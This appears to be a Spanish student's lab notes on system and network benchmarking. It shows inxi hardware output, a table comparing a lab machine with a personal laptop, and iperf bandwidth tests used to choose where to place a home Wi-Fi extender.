Graphics:  Device-1: Advanced Micro Devices [AMD/ATI] Renoir driver: amdgpu v: kernel 
           Display: x11 server: X.Org 1.20.13 driver: amdgpu,ati unloaded: fbdev,modesetting,vesa 
           resolution: 1920x1080~60Hz, 1920x1080~60Hz 
           OpenGL: renderer: AMD RENOIR (DRM 3.38.0 5.8.0-59-generic LLVM 12.0.0) v: 4.6 Mesa 21.0.3 
Network:   Device-1: Intel Wi-Fi 6 AX200 driver: iwlwifi 
           Device-2: Realtek RTL8111/8168/8411 PCI Express Gigabit Ethernet driver: r8169 
Drives:    Local Storage: total: 931.51 GiB used: 23.85 GiB (2.6%) 
Info:      Processes: 391 Uptime: 4h 18m Memory: 62.31 GiB used: 3.88 GiB (6.2%) Shell: bash inxi: 3.0.38 

Podemos ver las diferencias en la CPU, por ejemplo. Esa infomación es útil para comparar máquinas o simplemente por conocer especificaciones.

| |Lab |Mi ordenador |
|BogoMips |25599.84 | 92626.24 |
|CPU |Quad Core: Intel Core i5-6500 | 8-Core: AMD Ryzen 7 4800H |
|Network | Intel Ethernet I219-LM | Realtek RTL8111/8168/8411 |

### Práctica 1.27. Benchmark de red

Ahora voy a probar otro benchmark, para comprobar la calidad de mi conexión.
Voy a comparar dos redes que tengo en casa, ambas desde mi habitación, la primera es el ruter y la segunda un extensor.

$>iperf -c 192.168.1.26
------------------------------------------------------------
Client connecting to 192.168.1.26, TCP port 5001
TCP window size: 85.0 KByte (default)
------------------------------------------------------------
[  3] local 192.168.1.216 port 44188 connected with 192.168.1.26 port 5001
[ ID] Interval       Transfer     Bandwidth
[  3]  0.0-10.2 sec  6.12 MBytes  5.02 Mbits/sec


$>iperf -c 192.168.1.68
------------------------------------------------------------
Client connecting to 192.168.1.68, TCP port 5001
TCP window size: 85.0 KByte (default)
------------------------------------------------------------
[  3] local 192.168.1.216 port 51054 connected with 192.168.1.68 port 5001
[ ID] Interval       Transfer     Bandwidth
[  3]  0.0-10.1 sec  12.2 MBytes  10.2 Mbits/sec

Esto lo he usado para ver donde colocar el extensor, he descubierto que el lugar para tener la mejor conexión en el comedor es en el pasillo.(Lo he movido unos dos metros, creo que en un su lugar habitual le afectaban los electrodomésticos de la cocina ¡curioso!)

